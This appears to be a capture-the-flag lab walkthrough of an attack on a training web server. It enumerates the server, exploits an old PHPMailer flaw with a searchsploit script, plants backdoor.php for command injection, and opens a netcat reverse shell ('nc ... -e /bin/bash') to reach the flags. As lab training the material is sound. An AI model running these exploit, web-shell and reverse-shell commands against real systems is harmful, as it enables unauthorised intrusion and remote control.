# **TARGET 1 Offensive WalkThrough**

## Overview

You are working as a Security Engineer for X-CORP, supporting the SOC infrastructure. The SOC analysts have noticed some discrepancies with alerting in the Kibana system and the manager has asked the Security Engineering team to investigate.

To start, your team needs to confirm that newly created alerts are working. Once the alerts are verified to be working, you will monitor live traffic on the wire to detect any abnormalities that aren't reflected in the alerting system.

You will then report back all your findings to both the SOC manager and the Engineering Manager with appropriate analysis.

>##### Note: This is a walkthrough detailing one method to exploit the vulnerable machine. Likewise, other methods have been explored. Read Team: Summary of Operation and the PowerPoint presentation to find more methods not specified in this walkthrough.

---

Tools:

- nmap

- wpscan

- google developers tool

- Q terminal

- Kali Linux

- ssh

- Bash Commands

- Mysql

- John the Ripper

- Python Script

---

## **Walkthrough**

1.  The existence of a Directory index was found while using Nikto to find vulnerabilities on the webserver

        nikto -C all -h 192.168.1.115

    ![2](/Images/4/2.PNG)

2. Several paths to explore are revealed with the use of Gobuster.

        gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -e -u http://192.168.1.115

    ![3](/Images/4/3.PNG)

3. Exploring `192.168.1.115/vendor/` with the browser, we found several important paths including four revealing the use of PHPMAILER.
    
    Open URL in the browser

        192.168.1.115/vendor/

    ![4](/Images/4/4.PNG)     
        
4. PATH: reveals the first flag.

    Double click link

        192.168.1.115/vendor/PATH

    **Flag1**

    ![5](/Images/4/5.PNG)

5. SECURITY.md: Reveals details of versions of the PHPMAILER.

    Double Click to open file on browser

    ![6](/Images/4/6.PNG)    

6. VERSION: Reveals the current version of PHPMAILER in use

    Double click link

    ![7](/Images/4/7.PNG)  

7. Search script to exploit vulnerability 

        searchsploit phpmailer

    ![8](/Images/4/8.PNG)  

8. Look at Python Script

        Open on browser the path `192.168.1.115/vendor/PATH`

    ![9](/Images/4/9.PNG) 

9. press "q" keyboard to quit view

10. Download the script to the current folder

        searchsploit phpmailer -m php/webapps/40968.sh

    ![10](/Images/4/10.PNG)

11. Authorize file to execute

        sudo chmod 777 40968.sh

12. run exploit

        ./40968.sh 192.168.1.115

    ![11](/Images/4/11.PNG)

13. Now we know the PHPMAILER can be exploited. We can find and use a more useful script that allow to create a shell to the vulnerable machine. Exploit.sh installs a backdoor.php file that give the capability to execute command injection attacks.

    [exploit.sh](/Resources/explot.sh)

14. We take a look at the script and customize it for this exploit. (change the URL for the target machine)

        nano exploit.sh

    ##### Note: Use "CTRL X", then "y", and "enter" (to exit nano)

    ![12](/Images/4/12.PNG)

16. Authorize file to execute

         sudo chmod 777 exploit.sh

17. Execute file

        ./exploit.sh

    ![13](/Images/4/13.PNG)

18. Backdoor.php let us run bash commands like netcat. We can use netcat to create a shell. First set netcat to lisent on kali machine

         nc -lnvp 4444

   ![14](/Images/4/14.PNG)

19. Next, we look at our own IP address to use it with netcat to call our kali machine from the exploited machine (Target 2). 

        ifconfig

   ![15](/Images/4/15.PNG)


20. We use our IP address with netcat to call our kali machine from the exploited machine (Target2). We insert the command throuht the browser

        192.168.1.115/backdoor.php?cmd=nc 192.168.1.101 4444 -e /bin/bash

    ##### Note: change the second IPaddress for your own 

    ![16](/Images/4/16.PNG)

20. Now we have access. We look for the second flag

        find /var/www -type f -iname 'flag*'

    ![17](/Images/4/17.PNG)

21. Open file

        cat /var/www/flag2.txt

    **flag2**

    ![18](/Images/4/18.PNG)

23. Look for others flags

        find -type f -iname '*flag*'

    ![19](/Images/4/19.PNG)

21. We found the file active on wordpress, so we go to that direction on the browser

        http://192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png

    **flag3**
   ![20](/Images/4/20.PNG)